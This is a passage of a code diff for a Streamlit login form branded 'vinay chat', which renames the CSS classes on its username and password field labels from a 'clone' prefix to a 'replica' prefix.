-    st.markdown("<p class='clone-brand-text'>vinay chat</p>", unsafe_allow_html=True)
+    st.markdown("<p class='replica-brand-text'>vinay chat</p>", unsafe_allow_html=True)
     
     with st.form("screenshot_replica_form_engine", clear_on_submit=False):
-        st.markdown("<span class='clone-gray-label'>Username or Email</span>", unsafe_allow_html=True)
+        st.markdown("<span class='replica-field-title'>Username or Email</span>", unsafe_allow_html=True)
         login_user_string = st.text_input("user_replica", placeholder="Your Username Here", label_visibility="collapsed")
         
         st.write("")
         
-        st.markdown("<span class='clone-gray-label'>Password</span>", unsafe_allow_html=True)
-        login_pass_string = st.text_input("pass_replica", type="password", placeholder="••••••••", label_visibilit
+        st.markdown("<span class='replica-field-title'>Password</span>", unsafe_allow_html=True)
+        login_pass_string = st.text_input("pass_replica", type="password", placeholder="••••••••", label_visibility="colla
